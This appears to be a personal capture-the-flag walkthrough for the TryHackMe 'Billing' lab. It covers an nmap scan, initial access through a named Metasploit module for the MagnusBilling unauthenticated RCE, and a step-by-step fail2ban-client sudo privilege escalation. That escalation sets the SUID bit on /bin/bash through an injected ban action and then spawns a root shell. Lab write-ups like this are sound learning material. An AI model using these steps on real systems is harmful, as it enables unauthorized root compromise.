---
title: "billing"
tags:
  - fetus
---
- room link: https://tryhackme.com/room/billing
## initial enum:
- nmap Ascan with [[rustscan]]:
```sh fold title:"Ascan.txt"
# Nmap 7.95 scan initiated Sun Nov  9 22:51:37 2025 as: /usr/lib/nmap/nmap -vvv -p 22,80,3306,5038 -4 -T4 -A -oN Ascan.txt 10.201.32.227
Nmap scan report for 10.201.32.227
Host is up, received reset ttl 61 (0.39s latency).
Scanned at 2025-11-09 22:51:37 +06 for 28s

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 22:69:8e:c8:1f:1c:57:da:1f:1e:90:45:90:63:a1:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAY2ZTJLAuG94t2ydfTs4NaT/K+cupJI/lSAEdapAncDpfbWikpOog6+AsN3XWVAQJP8UBEeb+cdzJPzIdZVikQ=
|   256 da:62:49:df:4d:5c:f6:04:b3:8b:4a:27:51:e9:5a:d3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOygSntznv4VZKqBNtQIBUDrGP6tfuVxlb2pDPHUZY8g
80/tcp   open  http     syn-ack ttl 61 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://10.201.32.227/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql    syn-ack ttl 61 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 61 Asterisk Call Manager 2.10.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/9%OT=22%CT=%CU=40807%PV=Y%DS=4%DC=T%G=N%TM=6910C6B5
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11
OS:NW7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 12.101 days (since Tue Oct 28 20:26:12 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   303.24 ms 10.14.0.1
2   ... 3
4   372.32 ms 10.201.32.227

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  9 22:52:05 2025 -- 1 IP address (1 host up) scanned in 28.81 seconds
```

## exploitation:
- dug around with versions and keywords. found `linux/http/magnusbilling_unauth_rce_cve_2023_30258` on metasploit. got access as user `asterisk` that can do `(ALL) NOPASSWD: /usr/bin/fail2ban-client` as sudo :)
### fail2ban privesc explanation:
- fail2ban basically monitors log files and stuff of specific services for triggers (these are called "jails") and runs commands set for the triggers (called "actions"). since we can run it as root we can basically modify what actions are taken upon trigger as we wish so we can basically get it to run any command as root ;) 
- we can check what "jails" are active and listening for triggers by doing:
```sh
sudo fail2ban-client status
```
- output:
```sh
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

- we can further see what actions these jails have set by doing:
```sh
sudo fail2ban-client get sshd actions
```
- output:
```sh
The jail sshd has the following actions:
iptables-multiport
```
- `iptables-multiport` can be found at `/etc/fail2ban/action.d/iptables-multiport.conf` along with every other actions for every jail 

- we can now basically overwrite an existing action with a malicious payload or just add another action to a jail and then trigger it. im gonna do it the second way :)
```sh
sudo fail2ban-client set sshd addaction skibidi
sudo fail2ban-client set sshd action skibidi actionban "chmod +s /bin/bash"
sudo fail2ban-client set sshd banip 69.69.69.69
```

- lets check if it got its SUID set:
```sh
ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
```

- yay now just run `bash -ip` to get partial root and then just follow [[partialRootToFullRootChecklist]] to get full root <br>
![[billingHasBeenRooted.png]]